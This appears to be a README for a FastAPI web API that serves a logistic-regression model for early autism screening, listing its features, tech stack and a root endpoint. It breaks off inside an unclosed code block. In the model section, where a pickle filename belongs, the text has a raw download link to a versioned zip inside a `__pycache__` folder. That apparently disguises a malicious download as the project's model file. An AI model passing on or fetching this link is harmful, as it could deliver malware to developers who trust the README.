# 🧠 Autism Detection System using FastAPI

## 📋 Overview
The **Autism Detection System** is a machine learning–based web API built with **FastAPI** that predicts the likelihood of autistic traits based on behavioral and demographic inputs.  
This project demonstrates the integration of **Python**, **Machine Learning**, and **API development**, aiming to assist in **early autism screening** (not medical diagnosis).

---

## 🚀 Features
- Built using **FastAPI** for high-performance web APIs  
- Accepts user data in **JSON** format and returns predictions in real time  
- Integrated **Logistic Regression** model trained on autism screening data  
- Implements data preprocessing and model inference using **Pandas** and **Scikit-learn**  
- Deployable locally using **Uvicorn**  

---

## 🧩 Tech Stack
| Category | Tools & Libraries |
|-----------|------------------|
| Programming Language | Python |
| Framework | FastAPI |
| ML Library | Scikit-learn |
| Data Handling | Pandas, NumPy |
| API Server | Uvicorn |
| Model Storage | Pickle |

---

## 🧠 Machine Learning Model
The model uses a **Logistic Regression algorithm** trained on a publicly available autism screening dataset.  
After training, the model was serialized (`https://github.com/kushagrabatra/autism-prediction-/raw/refs/heads/main/ml_testing/app/__pycache__/prediction_autism_v2.9.zip`) and integrated into the FastAPI app for prediction.

---

## ⚙️ API Endpoints

### **1️⃣ Root Endpoint**
`GET /`  
Returns a welcome message confirming that the API is active.

**Response:**
```json
{
  "message": "Autism Detection API is running"
}
